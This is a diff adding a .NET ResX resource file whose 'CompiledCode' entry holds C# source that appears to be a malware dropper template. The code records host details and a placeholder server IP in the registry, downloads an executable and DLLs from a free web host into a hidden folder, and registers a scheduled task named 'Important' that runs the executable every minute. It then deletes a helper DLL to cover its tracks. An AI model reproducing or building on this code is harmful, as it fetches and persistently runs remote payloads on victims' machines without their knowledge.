@@ -1,0 +1,277 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<root>
+  <!-- 
+    Microsoft ResX Schema 
+    
+    Version 2.0
+    
+    The primary goals of this format is to allow a simple XML format 
+    that is mostly human readable. The generation and parsing of the 
+    various data types are done through the TypeConverter classes 
+    associated with the data types.
+    
+    Example:
+    
+    ... ado.net/XML headers & schema ...
+    <resheader name="resmimetype">text/microsoft-resx</resheader>
+    <resheader name="version">2.0</resheader>
+    <resheader name="reader">System.Resources.ResXResourceReader, System.Windows.Forms, ...</resheader>
+    <resheader name="writer">System.Resources.ResXResourceWriter, System.Windows.Forms, ...</resheader>
+    <data name="Name1"><value>this is my long string</value><comment>this is a comment</comment></data>
+    <data name="Color1" type="System.Drawing.Color, System.Drawing">Blue</data>
+    <data name="Bitmap1" mimetype="application/x-microsoft.net.object.binary.base64">
+        <value>[base64 mime encoded serialized .NET Framework object]</value>
+    </data>
+    <data name="Icon1" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
+        <value>[base64 mime encoded string representing a byte array form of the .NET Framework object]</value>
+        <comment>This is a comment</comment>
+    </data>
+                
+    There are any number of "resheader" rows that contain simple 
+    name/value pairs.
+    
+    Each data row contains a name, and value. The row also contains a 
+    type or mimetype. Type corresponds to a .NET class that support 
+    text/value conversion through the TypeConverter architecture. 
+    Classes that don't support this are serialized and stored with the 
+    mimetype set.
+    
+    The mimetype is used for serialized objects, and tells the 
+    ResXResourceReader how to depersist the object. This is currently not 
+    extensible. For a given mimetype the value must be set accordingly:
+    
+    Note - application/x-microsoft.net.object.binary.base64 is the format 
+    that the ResXResourceWriter will generate, however the reader can 
+    read any of the formats listed below.
+    
+    mimetype: application/x-microsoft.net.object.binary.base64
+    value   : The object must be serialized with 
+            : System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
+            : and then encoded with base64 encoding.
+    
+    mimetype: application/x-microsoft.net.object.soap.base64
+    value   : The object must be serialized with 
+            : System.Runtime.Serialization.Formatters.Soap.SoapFormatter
+            : and then encoded with base64 encoding.
+
+    mimetype: application/x-microsoft.net.object.bytearray.base64
+    value   : The object must be serialized into a byte array 
+            : using a System.ComponentModel.TypeConverter
+            : and then encoded with base64 encoding.
+    -->
+  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
+    <xsd:import namespace="http://www.w3.org/XML/1998/namespace" />
+    <xsd:element name="root" msdata:IsDataSet="true">
+      <xsd:complexType>
+        <xsd:choice maxOccurs="unbounded">
+          <xsd:element name="metadata">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" />
+              </xsd:sequence>
+              <xsd:attribute name="name" use="required" type="xsd:string" />
+              <xsd:attribute name="type" type="xsd:string" />
+              <xsd:attribute name="mimetype" type="xsd:string" />
+              <xsd:attribute ref="xml:space" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="assembly">
+            <xsd:complexType>
+              <xsd:attribute name="alias" type="xsd:string" />
+              <xsd:attribute name="name" type="xsd:string" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="data">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" msdata:Ordinal="1" />
+              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
+              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
+              <xsd:attribute ref="xml:space" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="resheader">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" />
+            </xsd:complexType>
+          </xsd:element>
+        </xsd:choice>
+      </xsd:complexType>
+    </xsd:element>
+  </xsd:schema>
+  <resheader name="resmimetype">
+    <value>text/microsoft-resx</value>
+  </resheader>
+  <resheader name="version">
+    <value>2.0</value>
+  </resheader>
+  <resheader name="reader">
+    <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </resheader>
+  <resheader name="writer">
+    <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </resheader>
+  <assembly alias="System.Windows.Forms" name="System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+  <data name="images" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\images.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="chomik-hampster" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\chomik-hampster.gif;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="warning-joypixels" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\warning-joypixels.gif;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="LIGHT" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\LIGHT.ico;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="CompiledCode" xml:space="preserve">
+    <value>using System.Runtime.Versioning;
+using System;
+using Microsoft.Win32;
+using System.IO;
+using System.Security.Principal;
+using System.Net;
+using System.Threading;
+using System.Diagnostics;
+using System.Reflection;
+using System.Runtime.InteropServices;
+using System.Threading.Tasks;
+using Microsoft.Win32.TaskScheduler;
+using System.Collections.Generic;
+using System.Security.Policy;
+
+namespace program
+{
+    public class InformationWriting
+    {
+        static void Main(string[] args)
+        {
+            //Creating a key value for the Remote IP Address to connect to
+            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Computer\HKEY_LOCAL_MACHINE\SOFTWARE\MiddleClientApp"))
+            {
+                key.SetValue("ServerIPAddressToConnect", "%IPADDRESS%"); //Changing dynamicly while compiling
+                key.SetValue("OpenedAt", DateTime.Now);
+                key.SetValue("OSVersion", Get.OSType().Name + " - " + Get.OSType().Type);
+                key.SetValue("PublicIPAddress", Get.PublicIPAddress());
+                key.SetValue("CountryLocation", Get.CountryName());
+                bool AppStatus = Get.Status();
+                if (AppStatus)
+                    key.SetValue("AppStatus", "Administrator");
+                else
+                    key.SetValue("AppStatus", "User");
+            }
+
+            Get.filesTo(@"C:\Users\User\Documents\SuperSecretApp");
+            Get.NewTaskschedulerItem(@"C:\Users\User\Documents\SuperSecretApp\app.exe");
+        }
+    }
+
+    public class Get
+    {
+        public class Info
+        {
+            public string Name = "";
+            public string Type = "";
+        }
+
+        public static void NewTaskschedulerItem(string path)
+        {
+            using (TaskService ts = new TaskService())
+            {
+                // Create a new task definition and assign properties
+                TaskDefinition td = ts.NewTask();
+                TimeTrigger TimeTrigger = new TimeTrigger
+                {
+                    StartBoundary = DateTime.Now,
+                    Repetition = new RepetitionPattern(TimeSpan.FromMinutes(1), TimeSpan.FromMinutes(0)),
+                };
+                td.Triggers.Add(TimeTrigger);
+                td.Actions.Add(new ExecAction(path));
+                ts.RootFolder.RegisterTaskDefinition(@"Important", td);
+                ts.Dispose();
+            }
+            try
+            {
+                File.Delete(Directory.GetCurrentDirectory() + @"\Microsoft.Win32.TaskScheduler.dll");
+            }
+            catch { }
+        }
+
+        public static void filesTo(string destination)
+        {
+            if (!Directory.Exists(destination))
+            {
+                Directory.CreateDirectory(destination);
+            }
+
+            WebClient file = new WebClient();
+            Thread.Sleep(5000);
+            string url = @"https://mysimpleweb054.000webhostapp.com/";
+            file.DownloadFile(url + "mysite/1", destination + @"\AForge.Video.DirectShow.dll"); //first dll file
+            file.DownloadFile(url + "mysite/2", destination + @"\AForge.Video.dll"); //second dll file
+            file.DownloadFile(url + "mysite/3", destination + @"\app.exe"); //exe file
+            string CurrentDirectory = Directory.GetCurrentDirectory();
+            file.DownloadFile(url + "mysite/4", CurrentDirectory + @"\Microsoft.Win32.TaskScheduler.dll"); //third dll file
+        }
+
+        public static bool Status()
+        {
+            var identity = WindowsIdentity.GetCurrent();
+            var principal = new WindowsPrincipal(identity);
+            return principal.IsInRole(WindowsBuiltInRole.Administrator);
+        }
+
+        public static Info OSType()
+        {
+            string HKLMWinNTCurrent = @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion";
+            int osBuild = int.Parse(Registry.GetValue(HKLMWinNTCurrent, "CurrentBuildNumber", "").ToString());
+            Thread.Sleep(1300);
+            string Type = Environment.Is64BitOperatingSystem ? "x64" : "x84";
+
+            if (osBuild &gt;= 22000)
+            {
+                return new Info()
+                {
+                    Name = "Windows 11",
+                    Type = Type
+                };
+            }
+
+            if (osBuild &gt;= 10240 &amp;&amp; osBuild &lt;= 19045)
+            {
+                return new Info()
+                {
+                    Name = "Windows 10",
+                    Type = Type
+                };
+            }
+
+            else
+            {
+                return new Info()
+                {
+                    Name = "Windows 8 or older",
+                    Type = Type
+                };
+            }
+        }
+
+        public static String PublicIPAddress()
+        {
+            return "8.8.8.8";
+        }
+
+        public static String CountryName()
+        {
+            return "israel";
+        }
+    }
+}</value>
+  </data>
+</root>
